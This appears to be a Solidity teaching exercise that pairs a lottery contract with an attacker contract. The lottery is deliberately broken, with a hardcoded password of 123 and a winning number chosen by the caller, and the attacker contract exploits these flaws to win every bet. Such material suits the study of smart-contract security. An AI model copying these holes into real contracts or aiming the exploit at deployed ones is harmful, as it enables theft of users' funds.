// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

contract LoteriaConPassword {
    constructor() payable {}

    uint256 public FACTOR =
        104312904618913870938864605146322161834075447075422067288548444976592725436353;

    function participarEnLoteria(uint8 password, uint256 _numeroGanador) public payable {
        require(msg.value == 1500, "Cantidad apuesta incorrecta");
        //require(uint256(keccak256(abi.encodePacked(password))) == FACTOR, "No es el hash correcto");
        require(uint256(password) == 123, "No es el hash correcto");

        // uint256 numRandom = uint256(
        //     keccak256(
        //         abi.encodePacked(
        //             FACTOR,
        //             msg.value,
        //             tx.origin,
        //             block.timestamp,
        //             msg.sender
        //         )
        //     )
        // );

        uint256 numeroGanador = _numeroGanador;

        if (numeroGanador == 1) {
            payable(msg.sender).transfer(msg.value * 2);
        }
    }
}

contract AttackerLoteria {
    LoteriaConPassword public loteria;

    constructor(address _loteriaAddress) payable {
        loteria = LoteriaConPassword(_loteriaAddress);
    }

    function attack(address _sc) public payable {
        if (_sc.balance == 1500) {
            loteria.participarEnLoteria{value: 1500}(123, 1);
        }
    }

    receive() external payable {}

    
}
